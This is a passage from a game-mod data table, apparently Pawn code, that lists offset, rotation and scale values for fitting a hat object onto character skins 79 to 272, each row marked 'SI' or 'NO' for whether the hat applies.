	{ 0.0, -0.012621, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 79 || Hat1 - NO
	{ 0.120414, -0.012621, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 80 || Hat1 - SI
	{ 0.120414, -0.012621, -0.005821, 0.000000, 0.000000, 352.484680, 1.000000, 1.000000, 1.000000 }, // SKINID 81 || Hat1 - SI
	{ 0.179196, -0.029663, -0.005821, 0.000000, 0.000000, 328.924438, 1.000000, 1.000000, 1.000000 }, // SKINID 82 || Hat1 - SI
	{ 0.179196, -0.029663, -0.005821, 0.000000, 0.000000, 328.924438, 1.000000, 1.000000, 1.000000 }, // SKINID 83 || Hat1 - SI
	{ 0.179196, -0.029663, -0.005821, 0.000000, 0.000000, 328.924438, 1.000000, 1.000000, 1.000000 }, // SKINID 84 || Hat1 - SI
	{ 0.0, -0.012682, 0.000000, 0.000000, 0.000000, 352.724517, 1.000000, 1.000000, 1.000000 }, // SKINID 85 || Hat1 - NO
	{ 0.109999, -0.019999, -0.009999, 0.000000, 0.000000, 340.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 86 || Hat1 - NO
	{ 0.0, -0.012682, 0.000000, 0.000000, 0.000000, 352.724517, 1.000000, 1.000000, 1.000000 }, // SKINID 87 || Hat1 - NO
	{ 0.0, -0.012682, 0.000000, 0.000000, 0.000000, 352.724517, 1.000000, 1.000000, 1.000000 }, // SKINID 88 || Hat1 - NO
	{ 0.0, -0.012682, 0.000000, 0.000000, 0.000000, 352.724517, 1.000000, 1.000000, 1.000000 }, // SKINID 89 || Hat1 - NO
	{ 0.0, -0.012682, 0.000000, 0.000000, 0.000000, 352.724517, 1.000000, 1.000000, 1.000000 }, // SKINID 90 || Hat1 - NO
	{ 0.158553, -0.025459, 0.000000, 0.000000, 0.000000, 347.299774, 1.000000, 1.000000, 1.000000 }, // SKINID 91 || Hat1 - SI
	{ 0.0, -0.025459, 0.000000, 0.000000, 0.000000, 347.299774, 1.000000, 1.000000, 1.000000 }, // SKINID 92 || Hat1 - NO
	{ 0.138744, -0.045086, -0.002152, 0.000000, 0.000000, 332.370269, 1.000000, 1.000000, 1.000000 }, // SKINID 93 || Hat1 - SI
	{ 0.0, -0.045086, -0.002152, 0.000000, 0.000000, 332.370269, 1.000000, 1.000000, 1.000000 }, // SKINID 94 || Hat1 - NO
	{ 0.117933, -0.031610, -0.002152, 0.000000, 0.000000, 337.346343, 1.000000, 1.000000, 1.000000 }, // SKINID 95 || Hat1 - SI
	{ 0.133088, -0.005893, -0.004789, 0.000000, 0.000000, 337.346343, 1.000000, 1.000000, 1.000000 }, // SKINID 96 || Hat1 - SI
	{ 0.121521, -0.029133, -0.004789, 0.000000, 0.000000, 337.346343, 1.000000, 1.000000, 1.000000 }, // SKINID 97 || Hat1 - SI
	{ 0.147238, -0.013274, -0.004789, 0.000000, 0.000000, 337.346343, 1.000000, 1.000000, 1.000000 }, // SKINID 98 || Hat1 - SI
	{ 0.0, -0.013274, -0.004789, 0.000000, 0.000000, 337.346343, 1.000000, 1.000000, 1.000000 }, // SKINID 99 || Hat1 - NO
	{ 0.168932, -0.050146, -0.004789, 0.000000, 0.000000, 331.010528, 1.000000, 1.000000, 1.000000 }, // SKINID 100 || Hat1 - SI
	{ 0.145517, -0.035615, -0.009948, 0.000000, 0.000000, 336.179534, 1.103076, 1.000000, 1.082140 }, // SKINID 101 || Hat1 - SI.
	{ 0.0, -0.035615, -0.009948, 0.000000, 0.000000, 336.179534, 1.103076, 1.000000, 1.082140 }, // SKINID 102 || Hat1 - NO
	{ 0.0, -0.035615, -0.009948, 0.000000, 0.000000, 336.179534, 1.103076, 1.000000, 1.082140 }, // SKINID 103 || Hat1 - NO
	{ 0.0, -0.035615, -0.009948, 0.000000, 0.000000, 336.179534, 1.103076, 1.000000, 1.082140 }, // SKINID 104 || Hat1 - NO
	{ 0.0, -0.035615, -0.009948, 0.000000, 0.000000, 336.179534, 1.103076, 1.000000, 1.082140 }, // SKINID 105 || Hat1 - NO
	{ 0.152731, -0.020035, -0.009948, 0.000000, 0.000000, 339.606719, 1.103076, 1.000000, 1.200073 }, // SKINID 106 || Hat1 - SI.
	{ 0.0, -0.020035, -0.009948, 0.000000, 0.000000, 339.606719, 1.103076, 1.000000, 1.200073 }, // SKINID 107 || Hat1 - NO.
	{ 0.0, -0.020035, -0.009948, 0.000000, 0.000000, 339.606719, 1.103076, 1.000000, 1.200073 }, // SKINID 108 || Hat1 - NO.
	{ 0.0, -0.020035, -0.009948, 0.000000, 0.000000, 339.606719, 1.103076, 1.000000, 1.200073 }, // SKINID 109 || Hat1 - NO.
	{ 0.0, -0.020035, -0.009948, 0.000000, 0.000000, 339.606719, 1.103076, 1.000000, 1.200073 }, // SKINID 110 || Hat1 - NO.
	{ 0.129386, -0.002775, -0.009948, 0.000000, 0.000000, 341.769042, 0.998616, 1.000000, 0.954466 }, // SKINID 111 || Hat1 - SI.
	{ 0.0, -0.002775, -0.009948, 0.000000, 0.000000, 341.769042, 0.998616, 1.000000, 0.954466 }, // SKINID 112 || Hat1 - NO.
	{ 0.161488, -0.006758, -0.007789, 0.000000, 0.000000, 350.751190, 0.889050, 1.000000, 1.017401 }, // SKINID 113 || Hat1 - SI.
	{ 0.0, -0.006758, -0.007789, 0.000000, 0.000000, 350.751190, 0.889050, 1.000000, 1.017401 }, // SKINID 114 || Hat1 - NO.
	{ 0.0, -0.006758, -0.007789, 0.000000, 0.000000, 350.751190, 0.889050, 1.000000, 1.017401 }, // SKINID 115 || Hat1 - NO
	{ 0.0, -0.006758, -0.007789, 0.000000, 0.000000, 350.751190, 0.889050, 1.000000, 1.017401 }, // SKINID 116 || Hat1 - NO
	{ 0.118653, 0.012436, -0.007789, 0.000000, 0.000000, 350.751190, 0.889050, 1.000000, 1.017401 }, // SKINID 117 || Hat1 - SI.
	{ 0.118653, 0.012436, -0.007789, 0.000000, 0.000000, 350.751190, 0.889050, 1.000000, 1.017401 }, // SKINID 118 || Hat1 - SI.
	{ 0.129999, 0.008000, -0.009999, 0.000000, 0.000000, 350.000000, 1.000000, 1.000000, 1.100000 }, // SKINID 119 || Hat1 - SI.
	{ 0.146318, -0.025716, -0.007789, 0.000000, 0.000000, 341.909881, 0.937113, 1.000000, 1.036702 }, // SKINID 120 || Hat1 - SI.
	{ 0.139072, -0.015518, -0.007789, 0.000000, 0.000000, 341.909881, 0.937113, 1.000000, 1.056487 }, // SKINID 121 || Hat1 - SI
	{ 0.127783, -0.009892, -0.007789, 0.000000, 0.000000, 341.909881, 0.937113, 1.000000, 1.056487 }, // SKINID 122 || Hat1 - SI.
	{ 0.157737, -0.028794, -0.007789, 0.000000, 0.000000, 341.909881, 0.937113, 1.000000, 1.151306 }, // SKINID 123 || Hat1 - SI.
	{ 0.157737, -0.017608, -0.007789, 0.000000, 0.000000, 341.909881, 0.937113, 1.000000, 1.036304 }, // SKINID 124 || Hat1 - SI.
	{ 0.131404, -0.002766, -0.007789, 0.000000, 0.000000, 341.909881, 0.937113, 1.000000, 0.941077 }, // SKINID 125 || Hat1 - SI.
	{ 0.144064, -0.039942, -0.007789, 0.000000, 0.000000, 328.634490, 0.937113, 1.000000, 1.010850 }, // SKINID 126 || Hat1 - SI.
	{ 0.139717, -0.024194, -0.007789, 0.000000, 0.000000, 328.634490, 0.937113, 1.000000, 1.074444 }, // SKINID 127 || Hat1 - SI.
	{ 0.147450, -0.033581, -0.007789, 0.000000, 0.000000, 326.999328, 0.937113, 1.000000, 1.132529 }, // SKINID 128 || Hat1 - SI.
	{ 0.088559, 0.001517, -0.007789, 0.000000, 0.000000, 326.999328, 1.338058, 1.000000, 0.888771 }, // SKINID 129 || Hat1 - SI.
	{ 0.058958, -0.002415, -0.010912, 0.000000, 0.000000, 326.999328, 0.988968, 1.000000, 1.128769 }, // SKINID 130 || Hat1 - SI.
	{ 0.123863, -0.002415, -0.010912, 0.000000, 0.000000, 350.770904, 0.988968, 1.000000, 1.073865 }, // SKINID 131 || Hat1 - SI.
	{ 0.056407, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.684180, 1.000000, 0.894486 }, // SKINID 132 || Hat1 - SI.
	{ 0.0, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.684180, 1.000000, 0.894486 }, // SKINID 133 || Hat1 - NO.
	{ 0.0, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.684180, 1.000000, 0.894486 }, // SKINID 134 || Hat1 - NO.
	{ 0.0, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.684180, 1.000000, 0.894486 }, // SKINID 135 || Hat1 - NO.
	{ 0.0, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.684180, 1.000000, 0.894486 }, // SKINID 136 || Hat1 - NO.
	{ 0.0, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.684180, 1.000000, 0.894486 }, // SKINID 137 || Hat1 - NO.
	{ 0.140619, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.088924 }, // SKINID 138 || Hat1 - SI.
	{ 0.140619, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.088924 }, // SKINID 139 || Hat1 - SI.
	{ 0.140619, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.088924 }, // SKINID 140 || Hat1 - SI.
	{ 0.137335, -0.012276, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.088924 }, // SKINID 141 || Hat1 - SI.
	{ 0.137335, -0.001362, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.088924 }, // SKINID 142 || Hat1 - SI.
	{ 0.0, -0.001362, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.088924 }, // SKINID 143 || Hat1 - NO.
	{ 0.193302, -0.027388, -0.010912, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 1.279586 }, // SKINID 144 || Hat1 - SI.
	{ 0.138405, -0.005317, -0.008311, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 0.984671 }, // SKINID 145 || Hat1 - SI.
	{ 0.138405, -0.005317, -0.008311, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 0.984671 }, // SKINID 146 || Hat1 - SI.
	{ 0.130529, -0.019639, -0.001685, 0.000000, 0.000000, 350.770904, 0.938905, 1.000000, 0.984671 }, // SKINID 147 || Hat1 - SI.
	{ 0.143284, -0.026097, -0.004171, 0.000000, 0.000000, 350.770904, 0.969615, 1.000000, 1.084500 }, // SKINID 148 || Hat1 - SI.
	{ 0.0, -0.026097, -0.004171, 0.000000, 0.000000, 350.770904, 0.969615, 1.000000, 1.084500 }, // SKINID 149 || Hat1 - NO:
	{ 0.124033, -0.035304, -0.004789, 0.000000, 0.000000, 323.380035, 1.000000, 1.000000, 0.939360 }, // SKINID 150 || Hat1 - SI
	{ 0.0, -0.035304, -0.004789, 0.000000, 0.000000, 323.380035, 1.000000, 1.000000, 0.939360 }, // SKINID 151 || Hat1 - NO
	{ 0.124033, -0.035304, -0.004789, 0.000000, 0.000000, 336.253540, 1.000000, 1.000000, 0.939360 }, // SKINID 152 || Hat1 - SI
	{ 0.0, -0.035304, -0.004789, 0.000000, 0.000000, 336.253540, 1.000000, 1.000000, 0.939360 }, // SKINID 153 || Hat1 - NO
	{ 0.120277, -0.025589, -0.004789, 0.000000, 0.000000, 339.665893, 1.000000, 1.000000, 0.984497 }, // SKINID 154 || Hat1 - SI
	{ 0.0, -0.025589, -0.004789, 0.000000, 0.000000, 339.665893, 1.000000, 1.000000, 0.984497 }, // SKINID 155 || Hat1 - NO
	{ 0.166981, -0.054828, -0.002724, 0.000000, 0.000000, 338.964263, 1.143386, 1.000000, 1.244510 }, // SKINID 156 || Hat1 - SI
	{ 0.112918, 0.000000, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 157 || Hat1 - SI
	{ 0.0, 0.000000, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 158 || Hat1 - NO
	{ 0.0, 0.000000, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 159 || Hat1 - NO
	{ 0.112918, 0.000000, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 160 || Hat1 - SI
	{ 0.0, 0.000000, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 161 || Hat1 - NO
	{ 0.141787, -0.010452, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 162 || Hat1 - SI
	{ 0.120976, 0.001487, -0.003829, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 163 || Hat1 - SI
	{ 0.120976, 0.001487, -0.012019, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.000000 }, // SKINID 164 || Hat1 - SI
	{ 0.126610, -0.011195, 0.000242, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.087626 }, // SKINID 165 || Hat1 - SI
	{ 0.126610, -0.011195, 0.000242, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.087626 }, // SKINID 166 || Hat1 - SI
	{ 0.0, -0.011195, 0.000242, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.087626 }, // SKINID 167 || Hat1 - NO
	{ 0.0, -0.011195, 0.000242, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.087626 }, // SKINID 168 || Hat1 - NO
	{ 0.138399, -0.023877, 0.000242, 0.000000, 0.000000, 341.065704, 1.000000, 1.000000, 1.087626 }, // SKINID 169 || Hat1 - SI
	{ 0.138676, -0.000109, -0.007213, 0.000000, 0.000000, 352.167907, 1.000000, 1.000000, 1.037200 }, // SKINID 170 || Hat1 - SI
	{ 0.164229, -0.012904, 0.000000, 0.000000, 0.000000, 351.712768, 1.000000, 1.000000, 1.000000 }, // SKINID 171 || Hat1 - SI
	{ 0.139651, -0.012904, -0.006265, 0.000000, 0.000000, 343.731628, 1.000000, 1.000000, 1.146476 }, // SKINID 172 || Hat1 - SI
	{ 0.0, -0.012904, -0.006265, 0.000000, 0.000000, 343.731628, 1.000000, 1.000000, 1.146476 }, // SKINID 173 || Hat1 - NO
	{ 0.0, -0.012904, -0.006265, 0.000000, 0.000000, 343.731628, 1.000000, 1.000000, 1.146476 }, // SKINID 174 || Hat1 - NO
	{ 0.0, -0.012904, -0.006265, 0.000000, 0.000000, 343.731628, 1.000000, 1.000000, 1.146476 }, // SKINID 175 || Hat1 - NO
	{ 0.139651, -0.036143, -0.006265, 0.000000, 0.000000, 328.196441, 1.000000, 1.000000, 1.146476 }, // SKINID 176 || Hat1 - SI
	{ 0.0, -0.036143, -0.006265, 0.000000, 0.000000, 328.196441, 1.000000, 1.000000, 1.146476 }, // SKINID 177 || Hat1 - NO
	{ 0.0, -0.036143, -0.006265, 0.000000, 0.000000, 328.196441, 1.000000, 1.000000, 1.146476 }, // SKINID 178 || Hat1 - NO
	{ 0.135375, -0.027852, -0.006265, 0.000000, 0.000000, 336.751373, 1.000000, 1.000000, 1.146476 }, // SKINID 179 || Hat1 - SI
	{ 0.164620, -0.054308, -0.009679, 0.000000, 0.000000, 333.560119, 1.000000, 1.000000, 1.146476 }, // SKINID 180 || Hat1 - SI
	{ 0.0, -0.054308, -0.009679, 0.000000, 0.000000, 333.560119, 1.000000, 1.000000, 1.146476 }, // SKINID 181 || Hat1 - NO
	{ 0.141432, 0.000000, -0.011670, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 182 || Hat1 - SI
	{ 0.141432, 0.000000, -0.011670, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 183 || Hat1 - SI
	{ 0.141432, 0.000000, -0.011670, 0.000000, 0.000000, 356.219146, 1.000000, 1.000000, 1.000000 }, // SKINID 184 || Hat1 - SI
	{ 0.167288, -0.027798, -0.004000, 2.629787, 0.000000, 346.775482, 1.000000, 1.000000, 1.000000 }, // SKINID 185 || Hat1 - SI
	{ 0.167288, -0.027798, -0.004000, 2.629787, 0.000000, 346.775482, 1.000000, 1.000000, 1.000000 }, // SKINID 186 || Hat1 - SI
	{ 0.131250, -0.027798, -0.004000, 2.357612, 0.000000, 341.684631, 1.000000, 1.000000, 1.000000 }, // SKINID 187 || Hat1 - SI
	{ 0.131250, -0.013544, -0.004000, 2.357612, 0.000000, 341.684631, 1.000000, 1.000000, 1.000000 }, // SKINID 188 || Hat1 - SI
	{ 0.178727, -0.021390, -0.004000, 2.357612, 0.000000, 356.365539, 1.000000, 1.000000, 1.000000 }, // SKINID 189 || Hat1 - SI
	{ 0.172598, -0.034072, -0.007253, 2.357612, 0.000000, 340.687713, 1.000000, 1.000000, 1.000000 }, // SKINID 190 || Hat1 - SI
	{ 0.172598, -0.034072, -0.007253, 2.357612, 0.000000, 340.687713, 1.000000, 1.000000, 1.147821 }, // SKINID 191 || Hat1 - SI
	{ 0.167594, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 192 || Hat1 - SI
	{ 0.167594, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 193 || Hat1 - SI
	{ 0.167594, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 194 || Hat1 - SI
	{ 0.0, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 195 || Hat1 - NO
	{ 0.0, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 196 || Hat1 - NO
	{ 0.0, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 197 || Hat1 - NO
	{ 0.0, -0.034072, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 198 || Hat1 - NO
	{ 0.130440, -0.004786, -0.007253, 2.357612, 0.000000, 342.403717, 1.000000, 1.000000, 1.147821 }, // SKINID 199 || Hat1 - SI
	{ 0.146635, 0.001232, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 1.147821 }, // SKINID 200 || Hat1 - SI
	{ 0.0, 0.001232, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 1.147821 }, // SKINID 201 || Hat1 - NO
	{ 0.0, 0.001232, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 1.147821 }, // SKINID 202 || Hat1 - NO
	{ 0.146635, 0.001232, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 1.147821 }, // SKINID 203 || Hat1 - SI
	{ 0.146635, 0.001232, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 1.147821 }, // SKINID 204 || Hat1 - SI
	{ 0.0, 0.001232, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 1.147821 }, // SKINID 205 || Hat1 - NO
	{ 0.146635, 0.005633, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 0.937262 }, // SKINID 206 || Hat1 - SI
	{ 0.110713, -0.007261, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 0.937262 }, // SKINID 207 || Hat1 - SI
	{ 0.125000, 0.008000, -0.009999, 0.000000, 0.000000, 350.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 208 || Hat1 - NO
	{ 0.0, -0.007261, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 0.937262 }, // SKINID 209 || Hat1 - NO
	{ 0.110713, -0.007261, -0.007253, 2.357612, 0.000000, 350.655761, 1.000000, 1.000000, 0.937262 }, // SKINID 210 || Hat1 - SI
	{ 0.147418, -0.025857, -0.004423, 2.357612, 0.000000, 344.286315, 1.000000, 1.000000, 0.937262 }, // SKINID 211 || Hat1 - SI
	{ 0.0, 0.010434, -0.004423, 2.357612, 0.000000, 344.286315, 1.000000, 1.000000, 0.937262 }, // SKINID 212 || Hat1 - NO
	{ 0.146859, -0.020953, -0.004423, 2.357612, 0.000000, 337.401458, 1.000000, 1.000000, 0.937262 }, // SKINID 213 || Hat1 - SI
	{ 0.160636, -0.017604, 0.000000, 0.000000, 0.000000, 358.192840, 1.000000, 1.000000, 1.000000 }, // SKINID 214 || Hat1 - SI
	{ 0.0, -0.017604, 0.000000, 0.000000, 0.000000, 358.192840, 1.000000, 1.000000, 1.000000 }, // SKINID 215 || Hat1 - NO
	{ 0.160636, -0.017604, 0.000000, 0.000000, 0.000000, 358.192840, 1.000000, 1.000000, 1.000000 }, // SKINID 216 || Hat1 - SI
	{ 0.142205, 0.006644, 0.000000, 0.000000, 0.000000, 341.290191, 1.000000, 1.000000, 1.000000 }, // SKINID 217 || Hat1 - SI
	{ 0.0, 0.006644, 0.000000, 0.000000, 0.000000, 341.290191, 1.000000, 1.000000, 1.000000 }, // SKINID 218 || Hat1 - NO
	{ 0.142205, -0.031149, 0.000000, 0.000000, 0.000000, 341.290191, 1.000000, 1.000000, 1.000000 }, // SKINID 219 || Hat1 - SI
	{ 0.0, -0.031149, 0.000000, 0.000000, 0.000000, 341.290191, 1.000000, 1.000000, 1.000000 }, // SKINID 220 || Hat1 - NO
	{ 0.190951, -0.031149, 0.000000, 0.000000, 0.000000, 357.111022, 1.000000, 1.000000, 1.000000 }, // SKINID 221 || Hat1 - SI
	{ 0.190951, -0.031149, 0.000000, 0.000000, 0.000000, 357.111022, 1.000000, 1.000000, 1.000000 }, // SKINID 222 || Hat1 - SI
	{ 0.190951, -0.007435, 0.000000, 0.000000, 0.000000, 352.024505, 1.000000, 1.000000, 1.000000 }, // SKINID 223 || Hat1 - SI
	{ 0.154248, -0.033056, 0.000000, 0.000000, 0.000000, 341.550415, 1.000000, 1.000000, 1.000000 }, // SKINID 224 || Hat1 - SI
	{ 0.154248, -0.033056, 0.000000, 0.000000, 0.000000, 341.550415, 1.000000, 1.000000, 1.000000 }, // SKINID 225 || Hat1 - SI
	{ 0.142912, -0.033056, 0.000000, 0.000000, 0.000000, 347.592559, 1.000000, 1.000000, 1.000000 }, // SKINID 226 || Hat1 - SI
	{ 0.147534, -0.003579, -0.010556, 0.000000, 0.000000, 341.749206, 1.000000, 1.000000, 1.000000 }, // SKINID 227 || Hat1 - SI
	{ 0.163885, -0.027008, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 228 || Hat1 - SI
	{ 0.126851, -0.037118, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 229 || Hat1 - SI
	{ 0.0, -0.037118, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 230 || Hat1 - NO
	{ 0.0, -0.037118, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 231 || Hat1 - NO
	{ 0.126851, -0.037118, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 232 || Hat1 - SI
	{ 0.146466, -0.037118, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 233 || Hat1 - SI
	{ 0.120998, -0.027749, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 234 || Hat1 - SI
	{ 0.081188, -0.025296, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 235 || Hat1 - SI
	{ 0.120190, -0.027475, -0.010556, 0.000000, 0.000000, 340.084472, 1.000000, 1.000000, 1.000000 }, // SKINID 236 || Hat1 - SI
	{ 0.120190, -0.027475, -0.010556, 0.000000, 0.000000, 336.580200, 1.000000, 1.000000, 1.000000 }, // SKINID 237 || Hat1 - SI
	{ 0.0, -0.027475, -0.010556, 0.000000, 0.000000, 336.580200, 1.000000, 1.000000, 1.000000 }, // SKINID 238 || Hat1 - NO
	{0.0, -0.027475, -0.010556, 0.000000, 0.000000, 336.580200, 1.000000, 1.000000, 1.000000 }, // SKINID 239 || Hat1 - NO
	{ 0.161402, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 240 || Hat1 - SI
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 241 || Hat1 - NO
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 242 || Hat1 - NO
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 243 || Hat1 - NO
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 244 || Hat1 - NO
	{ 0.161402, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 245 || Hat1 - SI
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 246 || Hat1 - NO
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 247 || Hat1 - NO
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 248 || Hat1 - NO
	{ 0.0, -0.027475, -0.007965, 0.000000, 0.000000, 342.346069, 1.000000, 1.000000, 1.000000 }, // SKINID 249 || Hat1 - NO
	{ 0.143284, -0.006071, -0.011766, 0.000000, 0.000000, 350.770904, 0.969615, 1.000000, 1.019091 }, // SKINID 250 || Hat1 - SI.
	{ 0.129524, -0.022446, -0.010617, 0.000000, 0.000000, 336.387725, 0.969615, 1.000000, 1.063670 }, // SKINID 251 || Hat1 - SI.
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 252 || Hat1 - NO.
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 253 || Hat1 - NO.
	{ 0.0, 0.000000, -0.006370, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.131554 }, // SKINID 254 || Hat1 - NO.
	{ 0.0, 0.000000, -0.006370, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.131554 }, // SKINID 255 || Hat1 - NO.
	{ 0.0, 0.000000, -0.006370, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.131554 }, // SKINID 256 || Hat1 - NO.
	{ 0.139914, -0.025659, -0.006370, 0.000000, 0.000000, 338.564331, 1.000000, 1.000000, 0.984799 }, // SKINID 257 || Hat1 - SI.
	{ 0.149824, -0.025659, -0.006370, 0.000000, 0.000000, 338.564331, 1.000000, 1.000000, 1.125806 }, // SKINID 258 || Hat1 - SI.
	{ 0.149824, -0.025659, -0.006370, 0.000000, 0.000000, 338.564331, 1.000000, 1.000000, 1.125806 }, // SKINID 259 || Hat1 - SI.
	{ 0.0, -0.025659, -0.006370, 0.000000, 0.000000, 338.564331, 1.000000, 1.000000, 1.125806 }, // SKINID 260 || Hat1 - NO.
	{ 0.0, -0.025659, -0.006370, 0.000000, 0.000000, 338.564331, 1.000000, 1.000000, 1.125806 }, // SKINID 261 || Hat1 - NO.
	{ 0.108261, 0.001541, -0.006370, 0.000000, 0.000000, 338.564331, 1.000000, 1.000000, 0.998337 }, // SKINID 262 || Hat1 - SI.
	{ 0.127416, -0.014097, -0.004904, 0.000000, 0.000000, 341.057495, 1.187035, 1.000000, 1.076132 }, // SKINID 263 || Hat1 - SI.
	{ 0.0, -0.014097, -0.004904, 0.000000, 0.000000, 341.057495, 1.187035, 1.000000, 1.076132 }, // SKINID 264 || Hat1 - NO.
	{ 0.127416, -0.014097, -0.004904, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 0.987667 }, // SKINID 265 || Hat1 - SI.
	{ 0.134032, -0.014307, -0.004904, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.053730 }, // SKINID 266 || Hat1 - SI.
	{ 0.131089, -0.031620, -0.004904, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.053730 }, // SKINID 267 || Hat1 - SI.
	{ 0.131089, -0.016403, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.162479 }, // SKINID 268 || Hat1 - SI.
	{ 0.0, -0.016403, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.162479 }, // SKINID 269 || Hat1 - NO.
	{ 0.0, -0.016403, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.162479 }, // SKINID 270 || Hat1 - NO.
	{ 0.0, -0.016403, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.162479 }, // SKINID 271 || Hat1 - NO.
	{ 0.148665, -0.007365, -0.008634, 0.000000, 0.000000, 341.057495, 0.965551, 1.000000, 1.108956 }, // SKINID 272 || Hat1 - SI.
